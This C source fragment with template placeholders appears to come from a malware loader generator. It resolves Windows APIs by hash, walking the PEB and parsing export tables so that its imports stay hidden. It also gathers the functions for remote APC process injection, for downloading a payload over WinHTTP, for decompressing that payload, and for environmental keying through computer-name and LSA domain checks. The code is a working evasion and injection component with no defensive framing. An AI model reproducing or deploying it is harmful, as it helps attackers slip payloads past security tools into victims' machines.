// --- 3. Hashing and Resolution Functions ---
DWORD HashString(const char* str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c; // hash * 33 + c
    }
    return hash;
}

HMODULE GetModuleHandleByHash(DWORD dwModuleNameHash) {
    if (dwModuleNameHash == 0) return NULL;

#ifdef _WIN64
    PPEB pPeb = (PEB*)(__readgsqword(0x60));
#else
    PPEB pPeb = (PEB*)(__readfsdword(0x30));
#endif

    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    PLIST_ENTRY listHead = &(pLdr->InMemoryOrderModuleList);
    PLIST_ENTRY currentEntry = listHead->Flink;

    while (currentEntry != listHead) {
        PLDR_DATA_TABLE_ENTRY pDte = CONTAINING_RECORD(currentEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        if (pDte->FullDllName.Length > 0) {
            char upperDllName[MAX_PATH];
            DWORD i = 0;
            while (pDte->FullDllName.Buffer[i] && i < MAX_PATH - 1) {
                char c = (char)pDte->FullDllName.Buffer[i];
                if (c >= 'a' && c <= 'z') { upperDllName[i] = c - 32; } 
                else { upperDllName[i] = c; }
                i++;
            }
            upperDllName[i] = '\0';
            
            char* last_slash = strrchr(upperDllName, '\\');
            char* module_name = last_slash ? last_slash + 1 : upperDllName;

            if (HashString(module_name) == dwModuleNameHash) {
                return (HMODULE)pDte->DllBase;
            }
        }
        currentEntry = currentEntry->Flink;
    }
    return NULL;
}

FARPROC GetProcAddressByHash(HMODULE hModule, DWORD dwApiNameHash) {
    if (hModule == NULL || dwApiNameHash == 0) return NULL;
    PBYTE pBase = (PBYTE)hModule;
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pImgExportDir->NumberOfNames; i++) {
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        if (dwApiNameHash == HashString(pFunctionName)) {
            return (FARPROC)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
        }
    }
    return NULL;
}

void ResolveAPIs() {
    DWORD KERNEL32_HASH = {{ hash_kernel32_dll }};
    DWORD NTDLL_HASH = {{ hash_ntdll_dll }};
    DWORD CABINET_HASH = {{ hash_cabinet_dll }};
    DWORD WINHTTP_HASH = {{ hash_winhttp_dll }};
    {% if guardrails_needed %}
    DWORD ADVAPI32_HASH = {{ hash_advapi32_dll }};
    {% endif %}

    HMODULE hKernel32 = GetModuleHandleByHash(KERNEL32_HASH);
    HMODULE hNtdll = GetModuleHandleByHash(NTDLL_HASH);
    
    pfnLoadLibraryA = (pLoadLibraryA)GetProcAddressByHash(hKernel32, {{ hash_loadlibrarya }});
    pfnVirtualAlloc = (pVirtualAlloc)GetProcAddressByHash(hKernel32, {{ hash_virtualalloc }});
    pfnCreateThread = (pCreateThread)GetProcAddressByHash(hKernel32, {{ hash_createthread }});
    pfnWaitForSingleObject = (pWaitForSingleObject)GetProcAddressByHash(hKernel32, {{ hash_waitforsingleobject }});
    pfnCloseHandle = (pCloseHandle)GetProcAddressByHash(hKernel32, {{ hash_closehandle }});
    pfnCreateFileMappingW = (pCreateFileMappingW)GetProcAddressByHash(hKernel32, {{ hash_createfilemappingw }});
    pfnMapViewOfFile = (pMapViewOfFile)GetProcAddressByHash(hKernel32, {{ hash_mapviewoffile }});
    pfnGetProcessHeap = (pGetProcessHeap)GetProcAddressByHash(hKernel32, {{ hash_getprocessheap }});
    pfnHeapAlloc = (pHeapAlloc)GetProcAddressByHash(hNtdll, {{ hash_rtlallocateheap }});
    pfnHeapFree = (pHeapFree)GetProcAddressByHash(hKernel32, {{ hash_heapfree }});
    pfnCreateFileA = (pCreateFileA)GetProcAddressByHash(hKernel32, {{ hash_createfilea }});
    pfnGetFileSize = (pGetFileSize)GetProcAddressByHash(hKernel32, {{ hash_getfilesize }});
    pfnReadFile = (pReadFile)GetProcAddressByHash(hKernel32, {{ hash_readfile }});
    pfnSleepEx = (pSleepEx)GetProcAddressByHash(hKernel32, {{ hash_sleepex }});

    if (hNtdll != NULL) {
        pfnRtlMoveMemory = (pRtlMoveMemory)GetProcAddressByHash(hNtdll, {{ hash_rtlmovememory }});
        pfnRtlZeroMemory = (pRtlZeroMemory)GetProcAddressByHash(hNtdll, {{ hash_rtlzeromemory }});
        pfnNtCreateSection = (pNtCreateSection)GetProcAddressByHash(hNtdll, {{ hash_ntcreatesection }});
        pfnNtMapViewOfSection = (pNtMapViewOfSection)GetProcAddressByHash(hNtdll, {{ hash_ntmapviewofsection }});
    }

    {% if execution_method == 'remoteapc' or guardrails_needed %}
    pfnLstrlenA = (pLstrlenA)GetProcAddressByHash(hKernel32, {{ hash_lstrlena }});
    pfnGetEnvironmentVariableA = (pGetEnvironmentVariableA)GetProcAddressByHash(hKernel32, {{ hash_getenvironmentvariablea }});
    {% endif %}

    {% if execution_method == 'remoteapc' %}
    pfnCreateProcessA = (pCreateProcessA)GetProcAddressByHash(hKernel32, {{ hash_createprocessa }});
    pfnVirtualAllocEx = (pVirtualAllocEx)GetProcAddressByHash(hKernel32, {{ hash_virtualallocex }});
    pfnWriteProcessMemory = (pWriteProcessMemory)GetProcAddressByHash(hKernel32, {{ hash_writeprocessmemory }});
    pfnVirtualProtectEx = (pVirtualProtectEx)GetProcAddressByHash(hKernel32, {{ hash_virtualprotectex }});
    pfnQueueUserAPC = (pQueueUserAPC)GetProcAddressByHash(hKernel32, {{ hash_queueuserapc }});
    pfnResumeThread = (pResumeThread)GetProcAddressByHash(hKernel32, {{ hash_resumethread }});
    pfnGetLastError = (pGetLastError)GetProcAddressByHash(hKernel32, {{ hash_getlasterror }});
    pfnNtCreateJobObject = (pNtCreateJobObject)GetProcAddressByHash(hNtdll, {{ hash_ntcreatejobobject }});
    pfnNtSetInformationJobObject = (pNtSetInformationJobObject)GetProcAddressByHash(hNtdll, {{ hash_ntsetinformationjobobject }});
    pfnNtAssignProcessToJobObject = (pNtAssignProcessToJobObject)GetProcAddressByHash(hNtdll, {{ hash_ntassignprocesstojobobject }});
    {% endif %}

    {% if data_source == 'embedded' %}
    pfnFindResourceA = (pFindResourceA)GetProcAddressByHash(hKernel32, {{ hash_findresourcea }});
    pfnLoadResource = (pLoadResource)GetProcAddressByHash(hKernel32, {{ hash_loadresource }});
    pfnLockResource = (pLockResource)GetProcAddressByHash(hKernel32, {{ hash_lockresource }});
    pfnSizeofResource = (pSizeofResource)GetProcAddressByHash(hKernel32, {{ hash_sizeofresource }});
    {% endif %}

    {% if bytecode_compression == 'mszip_compressor' %}
    HMODULE hCabinet = GetModuleHandleByHash(CABINET_HASH);
    if (hCabinet == NULL && pfnLoadLibraryA != NULL) { 
        hCabinet = pfnLoadLibraryA("cabinet.dll"); 
    }
    if (hCabinet != NULL) {
        pfnCreateDecompressor = (pCreateDecompressor)GetProcAddressByHash(hCabinet, {{ hash_createdecompressor }});
        pfnDecompress = (pDecompress)GetProcAddressByHash(hCabinet, {{ hash_decompress }});
        pfnCloseDecompressor = (pCloseDecompressor)GetProcAddressByHash(hCabinet, {{ hash_closedecompressor }});
    }
    {% endif %}

    {% if data_source == 'http' %}
    HMODULE hWinHttp = GetModuleHandleByHash(WINHTTP_HASH);
    if (hWinHttp == NULL && pfnLoadLibraryA != NULL) { hWinHttp = pfnLoadLibraryA("winhttp.dll"); }
    if (hWinHttp != NULL) {
        pfnWinHttpOpen = (pWinHttpOpen)GetProcAddressByHash(hWinHttp, {{ hash_winhttpopen }});
        pfnWinHttpConnect = (pWinHttpConnect)GetProcAddressByHash(hWinHttp, {{ hash_winhttpconnect }});
        pfnWinHttpOpenRequest = (pWinHttpOpenRequest)GetProcAddressByHash(hWinHttp, {{ hash_winhttpopenrequest }});
        pfnWinHttpSendRequest = (pWinHttpSendRequest)GetProcAddressByHash(hWinHttp, {{ hash_winhttpsendrequest }});
        pfnWinHttpReceiveResponse = (pWinHttpReceiveResponse)GetProcAddressByHash(hWinHttp, {{ hash_winhttpreceiveresponse }});
        pfnWinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable)GetProcAddressByHash(hWinHttp, {{ hash_winhttpquerydataavailable }});
        pfnWinHttpReadData = (pWinHttpReadData)GetProcAddressByHash(hWinHttp, {{ hash_winhttpreaddata }});
        pfnWinHttpCloseHandle = (pWinHttpCloseHandle)GetProcAddressByHash(hWinHttp, {{ hash_winhttpclosehandle }});
        pfnWinHttpCrackUrl = (pWinHttpCrackUrl)GetProcAddressByHash(hWinHttp, {{ hash_winhttpcrackurl }});
        pfnWinHttpSetOption = (pWinHttpSetOption)GetProcAddressByHash(hWinHttp, {{ hash_winhttpsetoption }});
        pfnWinHttpQueryHeaders = (pWinHttpQueryHeaders)GetProcAddressByHash(hWinHttp, {{ hash_winhttpqueryheaders }});
    }
    {% endif %}

    {% if guardrails_needed %}
    pfnGetComputerNameA = (pGetComputerNameA)GetProcAddressByHash(hKernel32, {{ hash_getcomputernamea }});
    
    HMODULE hAdvApi32 = GetModuleHandleByHash(ADVAPI32_HASH);
    if (hAdvApi32 == NULL && pfnLoadLibraryA != NULL) { 
        hAdvApi32 = pfnLoadLibraryA("advapi32.dll"); 
    }
    if (hAdvApi32 != NULL) {
        pfnLsaOpenPolicy = (pLsaOpenPolicy)GetProcAddressByHash(hAdvApi32, {{ hash_lsaopenpolicy }});
        pfnLsaQueryInformationPolicy = (pLsaQueryInformationPolicy)GetProcAddressByHash(hAdvApi32, {{ hash_lsaqueryinformationpolicy }});
        pfnLsaFreeMemory = (pLsaFreeMemory)GetProcAddressByHash(hAdvApi32, {{ hash_lsafreememory }});
        pfnLsaClose = (pLsaClose)GetProcAddressByHash(hAdvApi32, {{ hash_lsaclose }});
    }
    {% endif %}

    DEBUG_PRINT("API functions resolved by hash.");
}
